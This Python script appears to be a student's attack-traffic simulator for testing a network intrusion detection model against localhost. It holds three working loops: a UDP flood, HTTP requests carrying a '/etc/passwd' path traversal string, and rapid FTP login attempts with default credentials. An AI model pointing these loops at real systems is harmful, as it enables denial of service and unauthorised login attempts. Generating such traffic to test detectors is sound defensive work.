import socket
import time
import random

# Use Localhost as requested
TARGET_IP = "127.0.0.1"

def simulate_ddos():
    print("🚨 [ATTACK] Initiating Intense UDP Flood (DDoS)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1024
    t_end = time.time() + 5  # Run for 5 seconds to ensure the 3s sniffer catches it
    count = 0
    while time.time() < t_end:
        sock.sendto(payload, (TARGET_IP, 80))
        count += 1
    print(f"🛑 DDoS Complete. Sent {count} packets.")

def simulate_web_attack():
    print("🚨 [ATTACK] Initiating Web Attack (Payload Injection/Path Traversal)...")
    # We flood port 80 with multiple DIFFERENT sized malicious requests
    # This spikes 'Pkt Len Var' and 'Flow Byts/s' which the AI looks for
    t_end = time.time() + 5
    count = 0
    while time.time() < t_end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((TARGET_IP, 80))
            
            # Varying payload length to trigger 'Pkt Len Var' feature
            junk = "A" * random.randint(500, 3000)
            payload = f"GET /etc/passwd?id={junk} HTTP/1.1\r\nHost: target.com\r\n\r\n"
            sock.sendall(payload.encode())
            sock.close()
            count += 1
        except:
            pass
    print(f"🛑 Web Attack Simulation Complete. Sent {count} requests.")

def simulate_brute_force():
    print("🚨 [ATTACK] Initiating Intense Brute Force (Credential Stuffing)...")
    # Brute force needs to look like a lot of rapid, failed connections
    # This will spike 'RST Flag Cnt' (as the OS resets failed attempts) and 'Fwd Pkts/s'
    t_end = time.time() + 5
    count = 0
    while time.time() < t_end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            # Targeting Port 21 (FTP) as the model expects
            sock.connect((TARGET_IP, 21))
            sock.sendall(b"USER admin\r\nPASS 123456\r\n")
            # Forcing a reset/close immediately
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
            sock.close()
            count += 1
        except:
            pass
    print(f"🛑 Brute Force Complete. Attempted {count} logins.")

if __name__ == "__main__":
    print("=== M.Tech NIDS Attack Simulator (AGGRESSIVE VERSION) ===")
    print("1. DDoS Flood")
    print("2. Web Attack (Varying Payloads)")
    print("3. Brute Force (High Frequency)")
    
    choice = input("\nEnter choice (1/2/3): ")
    
    if choice == '1':
        simulate_ddos()
    elif choice == '2':
        simulate_web_attack()
    elif choice == '3':
        simulate_brute_force()
    else:
        print("Invalid Choice.")